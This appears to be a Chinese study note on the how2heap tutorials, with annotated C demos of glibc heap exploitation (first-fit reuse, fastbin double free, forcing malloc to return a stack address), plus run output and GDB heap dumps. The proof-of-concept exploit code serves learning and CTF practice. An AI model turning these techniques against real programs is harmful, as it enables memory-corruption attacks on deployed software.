# how2heap笔记(一)

**how2heap**是**shellphish**团队在**Github**上开源的堆漏洞系列教程，地址链接:https://github.com/shellphish/how2heap

| File                                                         | Technique                                                    | Glibc-Version | Applicable CTF Challenges                                    |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------- | ------------------------------------------------------------ |
| [first_fit.c](https://github.com/shellphish/how2heap/blob/master/first_fit.c) | Demonstrating glibc malloc's first-fit behavior.             |               |                                                              |
| [fastbin_dup.c](https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c) | Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist. |               |                                                              |
| [fastbin_dup_into_stack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c) | Tricking malloc into returning a nearly-arbitrary pointer by abusing the fastbin freelist. | latest        | [9447-search-engine](https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine), [0ctf 2017-babyheap](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html) |
| [fastbin_dup_consolidate.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_consolidate.c) | Tricking malloc into returning an already-allocated heap pointer by  putting a pointer on both fastbin freelist and unsorted bin freelist. | latest        | [Hitcon 2016 SleepyHolder](https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder) |
| [unsafe_unlink.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c) | Exploiting free on a corrupted chunk to get arbitrary write. | < 2.26        | [HITCON CTF 2014-stkof](http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/), [Insomni'hack 2017-Wheel of Robots](https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a) |
| [house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c) | Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer. | latest        | [hack.lu CTF 2014-OREO](https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo) |
| [poison_null_byte.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/poison_null_byte.c) | Exploiting a single null byte overflow.                      | < 2.26        | [PlaidCTF 2015-plaiddb](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb) |
| [house_of_lore.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_lore.c) | Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist. | < 2.26        |                                                              |
| [overlapping_chunks.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c) | Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk | < 2.26        | [hack.lu CTF 2015-bookstore](https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore), [Nuit du Hack 2016-night-deamonic-heap](https://github.com/ctfs/write-ups-2016/tree/master/nuitduhack-quals-2016/exploit-me/night-deamonic-heap-400) |
| [overlapping_chunks_2.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/overlapping_chunks_2.c) | Exploit the overwrite of an in use chunk size in order to make a new allocation overlap with an existing chunk | latest        |                                                              |
| [house_of_force.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c) | Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer | < 2.29        | [Boston Key Party 2016-cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6), [BCTF 2016-bcloud](https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200) |
| [unsorted_bin_into_stack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_into_stack.c) | Exploiting the overwrite of a freed chunk on unsorted bin freelist to return a nearly-arbitrary pointer. | < 2.26        |                                                              |
| [unsorted_bin_attack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c) | Exploiting the overwrite of a freed chunk on unsorted bin freelist to write a large value into arbitrary address | < 2.28        | [0ctf 2016-zerostorage](https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6) |
| [large_bin_attack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/large_bin_attack.c) | Exploiting the overwrite of a freed chunk on large bin freelist to write a large value into arbitrary address | < 2.26        | [0ctf 2018-heapstorm2](https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/) |
| [house_of_einherjar.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_einherjar.c) | Exploiting a single null byte overflow to trick malloc into returning a controlled pointer | < 2.26        | [Seccon 2016-tinypad](https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf) |
| [house_of_orange.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c) | Exploiting the Top Chunk (Wilderness) in order to gain arbitrary code execution | < 2.26        | [Hitcon 2016 houseoforange](https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500) |
| [tcache_dup.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c) | Tricking malloc into returning an already-allocated heap pointer by abusing the tcache freelist. | 2.26 - 2.28   |                                                              |
| [tcache_poisoning.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c) | Tricking malloc into returning a completely arbitrary pointer by abusing the tcache freelist. | > 2.25        |                                                              |
| [tcache_house_of_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_house_of_spirit.c) | Frees a fake chunk to get malloc to return a nearly-arbitrary pointer. | > 2.25        |                                                              |

# 0x01 **first_fit** 

源代码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
	fprintf(stderr, "This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n");
    //这个程序并不展示如何攻击,而是展示glibc的一种分配规则.
	fprintf(stderr, "glibc uses a first-fit algorithm to select a free chunk.\n");
    //glibc使用一种first-fit算法去选择一个free-chunk.
	fprintf(stderr, "If a chunk is free and large enough, malloc will select this chunk.\n");
    //如果存在一个free-chunk并且足够大的话,malloc会优先选取这个chunk.
	fprintf(stderr, "This can be exploited in a use-after-free situation.\n");
	//这种机制就可以在被利用于use after free的情形中.
	fprintf(stderr, "Allocating 2 buffers. They can be large, don't have to be fastbin.\n");
    //先分配两个buffer,可以分配大一点,是不是fastbin也无所谓.
	char* a = malloc(512);
	char* b = malloc(256);
	char* c;
	fprintf(stderr, "1st malloc(512): %p\n", a);
	fprintf(stderr, "2nd malloc(256): %p\n", b);
	fprintf(stderr, "we could continue mallocing here...\n");
    //我们也可以继续分配…
	fprintf(stderr, "now let's put a string at a that we can read later \"this is A!\"\n");
    //为了方便展示如何利用这个机制,我们在这里放置一个字符串 “this is A!”
	strcpy(a, "this is A!");
	fprintf(stderr, "first allocation %p points to %s\n", a, a);
    //我们使第一个分配的内存空间的地址指向这个字符串”this is A!”.
	fprintf(stderr, "Freeing the first one...\n");
    //然后free掉这块内存…
	free(a);
	fprintf(stderr, "We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n", a);
	//我们也不需要free其他内存块了.之后只要我们用malloc申请的内存大小小于第一块的512字节,都会给我们返回第一个内存块开始的地址
	fprintf(stderr, "So, let's allocate 500 bytes\n");
    //ok,我们现在开始用malloc申请500个字节试试.
	c = malloc(500);
	fprintf(stderr, "3rd malloc(500): %p\n", c);
	fprintf(stderr, "And put a different string here, \"this is C!\"\n");
    //然后我们在这个地方放置一个不同的字符串 “this is C!”
	strcpy(c, "this is C!");
	fprintf(stderr, "3rd allocation %p points to %s\n", c, c);
    //第三个返回的内存块的地址 0x662420 指向了这个字符串 “this is C!”.
	fprintf(stderr, "first allocation %p points to %s\n", a, a);
    //第一个返回的内存块的地址也指向这个字符串!
	fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.\n");
}
	//如果我们重新使用了第一次分配的内存空间，现在里面存储的是第三次分配的数据
```

这个程序的意思就是我们在申请了第一次内存地址后，Free掉再申请一次的话，得到了之前分配得到的内存地址，运行效果

```cc
syc@ubuntu:~/Downloads/tmp$ ./a.out
    
This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.
    
glibc uses a first-fit algorithm to select a free chunk.
    
If a chunk is free and large enough, malloc will select this chunk.
    
This can be exploited in a use-after-free situation.
    
Allocating 2 buffers. They can be large, don't have to be fastbin.
    
1st malloc(512): 0x85bf008
    
2nd malloc(256): 0x85bf210
    
we could continue mallocing here...
    
now let's put a string at a that we can read later "this is A!"
    
first allocation 0x85bf008 points to this is A!
    
Freeing the first one...
    
We don't need to free anything again. As long as we allocate less than 512, it will end up at 0x85bf008
    
So, let's allocate 500 bytes
    
3rd malloc(500): 0x85bf008
    
And put a different string here, "this is C!"
    
3rd allocation 0x85bf008 points to this is C!
    
first allocation 0x85bf008 points to this is C!
    
If we reuse the first allocation, it now holds the data from the third allocation.
```

从这里

```c
1st malloc(512): 0x85bf008
3rd malloc(500): 0x85bf008
```

我们可以发现两个指针指向了同一个地址

然后我们在GDB里面逐步分析，第一次malloc

```c
    0x804854c <main+129>       add    esp, 0x10
    0x804854f <main+132>       sub    esp, 0xc
    0x8048552 <main+135>       push   0x200
 →  0x8048557 <main+140>       call   0x8048390 <malloc@plt>
   ↳   0x8048390 <malloc@plt+0>   jmp    DWORD PTR ds:0x804a014
       0x8048396 <malloc@plt+6>   push   0x10
       0x804839b <malloc@plt+11>  jmp    0x8048360
       0x80483a0 <__libc_start_main@plt+0> jmp    DWORD PTR ds:0x804a018
       0x80483a6 <__libc_start_main@plt+6> push   0x18
       0x80483ab <__libc_start_main@plt+11> jmp    0x8048360
```

返回的Chunk地址就在EAX寄存器里面

```c
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x0       
$ecx   : 0xf7fb2780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffd040  →  0x00000200
$ebp   : 0xffffd068  →  0x00000000
$esi   : 0xf7fb2000  →  0x001b1db0
$edi   : 0xf7fb2000  →  0x001b1db0
$eip   : 0x0804855c  →  <main+145> add esp, 0x10
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
```

```c
gef➤  heap chunk 0x0804b008
Chunk(addr=0x804b008, size=0x208, flags=PREV_INUSE)
Chunk size: 520 (0x208)
Usable size: 516 (0x204)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

下一次malloc地址

```c
 →   14	 	char* b = malloc(256);
     15	 	char* c;
     16	 
     17	 	fprintf(stderr, "1st malloc(512): %p\n", a);
     18	 	fprintf(stderr, "2nd malloc(256): %p\n", b);
     19	 	fprintf(stderr, "we could continue mallocing here...\n");
```

```c
0xffffd040│+0x0000: 0x0804b008  →  "this is A!"	 ← $esp
0xffffd044│+0x0004: 0x00000001
0xffffd048│+0x0008: 0x00000019
0xffffd04c│+0x000c: 0xf7fb2cc0  →  0xfbad2887
0xffffd050│+0x0010: 0x00000001
0xffffd054│+0x0014: 0x0804b008  →  "this is A!"
0xffffd058│+0x0018: 0x0804b210  →  0x00000000
0xffffd05c│+0x001c: 0x08048731  →  <__libc_csu_init+33> lea eax, [ebx-0xf8]
```

```c
gef➤  heap chunk 0x0804b008
Chunk(addr=0x804b008, size=0x208, flags=PREV_INUSE)
Chunk size: 520 (0x208)
Usable size: 516 (0x204)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

第三次malloc

```c
gef➤  heap chunk 0x0804b008
Chunk(addr=0x804b008, size=0x1f8, flags=PREV_INUSE)
Chunk size: 504 (0x1f8)
Usable size: 500 (0x1f4)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

简单的说，**Use After Free** 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况

- 内存块被释放后，其对应的指针被设置为 **NULL** ， 然后再次使用，自然程序会崩溃。
- 内存块被释放后，其对应的指针没有被设置为 **NULL** ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
- 内存块被释放后，其对应的指针没有被设置为 **NULL**，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer（ 悬空指针 ）**

**野指针(wild pointer)**就是没有被初始化过的指针， 悬空指针是指针最初指向的内存已经被释放了的一种指针

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/1094457-20170227195731329-810447033.png)

无论是野指针还是悬空指针，都是**指向无效内存区域(这里的无效指的是"不安全不可控")的指针**。 访问"不安全可控"(**invalid**)的内存区域将导致"**Undefined Behavior**"

在程序的执行过程中，我们称由 **malloc** 申请的内存为 **chunk** 。这块内存在 **ptmalloc** 内部用 **malloc_chunk** 结构体来表示。当程序申请的 **chunk** 被 **free** 后，会被加入到相应的空闲管理列表中。

非常有意思的是，**无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构**。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。

用户 free 掉的内存并不是都会马上归还给系统，**ptmalloc 会统一管理 heap 和 mmap 映射区中空闲的 chunk**，当用户进行下一次分配请求时，ptmalloc 会在空闲的 chunk 中选择一个合适的分配给他，这样就避免了频繁地系统调用

**ptmalloc** 把大小相似的 **chunk**，用双向链表连接起来，这样就形成了一个 **bin**。**ptmalloc** 一共维护了 128 个这样的 **bin**，并使用数组来存储这些 bin 如下：

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/15548795-49ecc4bc156e439a.png)

### Fast Bin

 默认情况下（**32 位系统为例**）， **fastbin** 中默认支持最大的 **chunk** 的数据空间大小为 64  字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， **fastbin** 最多可以支持的 **bin** 的个数为 10  个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 **prev_size** 和 **size**  字段部分的大小）定义如下 

用户很有可能请求小的内存，而且释放之后也很可能再次请求小内存。所以合并释放小内存，并不明智。在 **fast** **bins** 中，不大于 **max_fast** （默认值为 64B）的 **chunk** 被释放后，首先会被放到 **fast bins** 中，**fast bins** 中的 **chunk** 并不改变它的使用标志 **P**。这样也就无法将它们合并，当需要给用户分配的 **chunk** 小于或等于 **max_fast** 时，**ptmalloc** 首先会在 **fast bins** 中查找相应的空闲块，如果找不到，才会去 **bins**（那个数组）中查找数据块。

在某个特定的时刻，**ptmalloc 会遍历整个 fast bins 将相邻的空闲 chunk 进行合并，并将合并后的 chunk 加入 unsorted bin 中，再加入到其他的 bin 中**

### Unsorted Bin 

如果被用户释放的 **chunk** 或在 **fast bins** 中合并的 **chunk** 大于 **max_fast**，则 **ptmalloc** 会把这些 **chunk** 放入 **unsorted bin** 中。在查找合适的 **chunk** 的时候，首先在 **unsorted bin** 中查找合适的空闲 **chunk**，然后才查找 **bins**。

**如果 unsorted bin 中没有合适的 chunk，**则会把 **unsorted bin** 中的 **chunk** 加入到 **bins** 的其他 **bin** 中，再进行查找

### Small Bin

数组中的第一个**bin**是 **unsorted bin**，数组中从第 2 个到第 64 个 **bin** 是 **small bin**,它的 **chunk size** 依次递增 **8bytes**，每个**small bin**中的**chunk**大小相同。 **small bins** 中每个 **chunk** 的大小与其所在的 **bin** 的 **index** 的关系为：**chunk_size = 2 * SIZE_SZ *index**，具体如下 

| 下标 | SIZE_SZ=4（32 位） | SIZE_SZ=8（64 位） |
| ---- | ------------------ | ------------------ |
| 2    | 16                 | 32                 |
| 3    | 24                 | 48                 |
| 4    | 32                 | 64                 |
| 5    | 40                 | 80                 |
| x    | 2*4*x              | 2*8*x              |
| 63   | 504                | 1008               |

**small bin** 是一个双向链表。双向链表不是循环链表，它是有顺序的。**在相同大小 chunk 的 bin 中 的排序是按照「最近使用」的顺序，也就是说，排在后面的最容易被选中，刚被释放的放在前面**

### Large Bin

**small bin** 后面是 **large bin**，**largin bin**中 **chunk** 的大小不是固定的，而是有一个范围。其中的顺序是按大小排序的，越大的放在越下面，如果大小相同，**按照「最近使用」的顺序**， **large bins** 中一共包括 63 个 **bin**，每个 **bin** 中的 **chunk** 的大小不一致，而是处于一定区间范围内。此外，这 63 个 **bin** 被分成了 6 组，每组 **bin** 中的 **chunk** 大小之间的公差一致，具体如下： 

| 组   | 数量 | 公差    |
| ---- | ---- | ------- |
| 1    | 32   | 64B     |
| 2    | 16   | 512B    |
| 3    | 8    | 4096B   |
| 4    | 4    | 32768B  |
| 5    | 2    | 262144B |
| 6    | 1    | 不限制  |

当空闲的 **chunk** 被连接到 **bin** 的时候，**ptmalloc** 会把表示该 **chunk** 是否正在使用的标志 **p** 设置为 0。（**注意！这个标志实际处在下一个 chunk 中**）。同时，**ptmalloc** 还会检查它前后（物理前后）的 **chunk** 是否为空，如果为空，**ptmalloc** 会把这些 **chunk** 合并成一个大的 **chunk**，然后把合并后的 **chunk** 放入 **unsorted bin** 中。但是对于较小的 **chunk**，**ptmalloc** 会把它放入 **fast bins** 中。

这个示例中，在64位系统中，分配的内存大小应该都属于**Small Bin**，我们第一次**Free**，**chunk**到了**bin**中的**Small Bin**，然后我们再次分配内存的时候，就会再次得到第一次分配的内存

# 0x02 fastbin_dup

源代码

```c
#include <stdio.h>
#include <stdlib.h
int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");
	//这个程序展示了一个利用fastbin进行的简单double-free攻击.
	fprintf(stderr, "Allocating 3 buffers.\n");
    //先分配三块内存.
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);
	fprintf(stderr, "Freeing the first one...\n");
    //free掉第一块内存…
	free(a);
	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    //如果我们再free第一块内存a的话,程序就会崩溃,然后报错.因为这个时候这块内存刚好在对应free-list的顶部,再次free这块内存的时候就会被检查到.
	// free(a);
	fprintf(stderr, "So, instead, we'll free %p.\n", b);
    //所以我们另外free一个,我们free第二块内存b.
	free(b);
	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
    //现在我们再次free第一块内存,程序不会崩溃，因为它已经不在链表顶部了.
	free(a);
	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
    //现在我们的free-list有这三块内存[a,b,a].
    //如果我们malloc三次的话,我们就会得到a两次!
	fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
}
```

运行效果

```c
syc@ubuntu:~/Downloads/tmp$ ./a.out
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x83b5008
2nd malloc(8): 0x83b5018
3rd malloc(8): 0x83b5028
Freeing the first one...
If we free 0x83b5008 again, things will crash because 0x83b5008 is at the top of the free list.
So, instead, we'll free 0x83b5018.
Now, we can free 0x83b5008 again, since it's not the head of the free list.
Now the free list has [ 0x83b5008, 0x83b5018, 0x83b5008 ]. If we malloc 3 times, we'll get 0x83b5008 twice!
1st malloc(8): 0x83b5008
2nd malloc(8): 0x83b5018
3rd malloc(8): 0x83b5008
```

GDB调试分析

第一次malloc：a

```c
gef➤  heap chunk 0x0804b008
Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

第二次malloc：b

```c
gef➤  heap chunk 0x0804b018
Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

第三次malloc：c

```c
gef➤  heap chunk 0x0804b028
Chunk(addr=0x804b028, size=0x10, flags=PREV_INUSE)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

第一次free，a已经并入了fastbin

```c
gef➤  heap bin
[+] No Tcache in this version of libc
─────────────────────────────────── Fastbins for arena 0xf7fb2780 ───────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE) 
Fastbins[idx=1, size=0x10] 0x00
Fastbins[idx=2, size=0x18] 0x00
Fastbins[idx=3, size=0x20] 0x00
Fastbins[idx=4, size=0x28] 0x00
Fastbins[idx=5, size=0x30] 0x00
Fastbins[idx=6, size=0x38] 0x00
──────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

第二次free，b已经并入了fastbin

```c
gef➤  heap bin
[+] No Tcache in this version of libc
─────────────────────────────────── Fastbins for arena 0xf7fb2780 ───────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE)  ←  Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE) 
Fastbins[idx=1, size=0x10] 0x00
Fastbins[idx=2, size=0x18] 0x00
Fastbins[idx=3, size=0x20] 0x00
Fastbins[idx=4, size=0x28] 0x00
Fastbins[idx=5, size=0x30] 0x00
Fastbins[idx=6, size=0x38] 0x00
```

再一次free a，可以发现fastbin里面出现了两次a

```c
gef➤  heap bin
[+] No Tcache in this version of libc
─────────────────────────────────── Fastbins for arena 0xf7fb2780 ───────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE)  ←  Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE)  ←  Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE)  →  [loop detected]
Fastbins[idx=1, size=0x10] 0x00
Fastbins[idx=2, size=0x18] 0x00
Fastbins[idx=3, size=0x20] 0x00
Fastbins[idx=4, size=0x28] 0x00
Fastbins[idx=5, size=0x30] 0x00
Fastbins[idx=6, size=0x38] 0x00
```

#### Double Free漏洞原理

- 对一个指向**malloc**分配的**heap**内存的指针**p**进行**free**之后，并没有将该指针置**NULL**。导致，即使**free**之后指针**p**仍然指向**heap**内存，潜在着利用的可能。

#### 利用基础

- 在堆漏洞利用里，很多都是基于触发**unlink**来实现任意代码执行的，**double free**也是基于此
- 不同于**unlink**的是，**unlink**是利用溢出来伪造**chunk**，实现**unlink**的。而**double  free**则一般是需要至少获得三个连续的**chunk**，再全部**free**。之后再重新分配两个大**chunk**（能够覆盖前面**free**的三个**chunk**），通过伪造**p**（利用绕过**unlink**的检查的技术伪造）**chunk**和一个引导触发**unlink**的**chunk**即可。构造如下图

 ![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/1.png)

注意，伪造的数据中fake_size 应该等于 fake_pre_size2+1。以满足大小一致检查

# 0x03 fastbin_dup_into_stack 

源代码

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");
	//这个程序更具体地展示了上一个程序所介绍的技巧,通过欺骗malloc来返回一个我们可控的区域的指针(在这个例子中,我们可以返回一个栈指针)
	unsigned long long stack_var;
	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);
	//我们想要malloc返回的地址是这个
	fprintf(stderr, "Allocating 3 buffers.\n");
    //首先分配三块内存:
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);
	fprintf(stderr, "Freeing the first one...\n");
    //free掉第一块内存…
	free(a);
	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    //和上一个程序一样,我们再free第一块内存是不行的,因为这个时候这块内存刚好在对应free-list的顶部,再次free这块内存的时候就会被检查到
	// free(a);
	fprintf(stderr, "So, instead, we'll free %p.\n", b);
    //所以我们free第二块
	free(b);
	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
    //现在我们可以free第一块了,程序不会崩溃，因为它已经不在链表顶部了，
	free(a);
	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
    //当前的free-list是这样的 [a,b,a]，我们将通过在第一块内存a上构造数据来进行攻击
	unsigned long long *d = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	//现在的free-list上面就只剩下了a
    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
    //
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
        //然后我们现在写一个假的chunk-size(在这里我们写入0x20)到栈上.(相当于在栈上伪造一块已经free的内存块)
		"so that malloc will think there is a free chunk there and agree to\n"
        //之后malloc就会认为存在这么一个free-chunk
		"return a pointer to it.\n", a);
        //并在之后的内存申请中返回这个地址
	stack_var = 0x20;
	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
    //现在,我们再修改a的前8个字节为刚才写下chunk-size的那个栈单元的前一个栈单元的地址
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
    //将栈地址放到free-list上
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));//成功返回栈地址
}
```

运行的效果

```
syc@ubuntu:~/Downloads/tmp$ ./a.out
This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0xff84ae18.
Allocating 3 buffers.
1st malloc(8): 0x8409008
2nd malloc(8): 0x8409018
3rd malloc(8): 0x8409028
Freeing the first one...
If we free 0x8409008 again, things will crash because 0x8409008 is at the top of the free list.
So, instead, we'll free 0x8409018.
Now, we can free 0x8409008 again, since it's not the head of the free list.
Now the free list has [ 0x8409008, 0x8409018, 0x8409008 ]. We'll now carry out our attack by modifying data at 0x8409008.
1st malloc(8): 0x8409008
2nd malloc(8): 0x8409018
Now the free list has [ 0x8409008 ].
Now, we have access to 0x8409008 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0x8409008 to point right before the 0x20.
3rd malloc(8): 0x8409008, putting the stack address on the free list
*** Error in `./a.out': malloc(): memory corruption (fast): 0xff84ae14 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xf7e11377]
/lib/i386-linux-gnu/libc.so.6(+0x6d2f7)[0xf7e172f7]
/lib/i386-linux-gnu/libc.so.6(+0x6f7cc)[0xf7e197cc]
/lib/i386-linux-gnu/libc.so.6(__libc_malloc+0xc5)[0xf7e1afc5]
./a.out[0x8048796]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xf7dc2637]
./a.out[0x8048441]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:01 955142                             /home/syc/Downloads/tmp/a.out
08049000-0804a000 r--p 00000000 08:01 955142                             /home/syc/Downloads/tmp/a.out
0804a000-0804b000 rw-p 00001000 08:01 955142                             /home/syc/Downloads/tmp/a.out
08409000-0842a000 rw-p 00000000 00:00 0                                  [heap]
f7c00000-f7c21000 rw-p 00000000 00:00 0 
f7c21000-f7d00000 ---p 00000000 00:00 0 
f7d6f000-f7d8b000 r-xp 00000000 08:01 1835262                            /lib/i386-linux-gnu/libgcc_s.so.1
f7d8b000-f7d8c000 rw-p 0001b000 08:01 1835262                            /lib/i386-linux-gnu/libgcc_s.so.1
f7da9000-f7daa000 rw-p 00000000 00:00 0 
f7daa000-f7f5a000 r-xp 00000000 08:01 1835281                            /lib/i386-linux-gnu/libc-2.23.so
f7f5a000-f7f5c000 r--p 001af000 08:01 1835281                            /lib/i386-linux-gnu/libc-2.23.so
f7f5c000-f7f5d000 rw-p 001b1000 08:01 1835281                            /lib/i386-linux-gnu/libc-2.23.so
f7f5d000-f7f60000 rw-p 00000000 00:00 0 
f7f7c000-f7f7e000 rw-p 00000000 00:00 0 
f7f7e000-f7f81000 r--p 00000000 00:00 0                                  [vvar]
f7f81000-f7f83000 r-xp 00000000 00:00 0                                  [vdso]
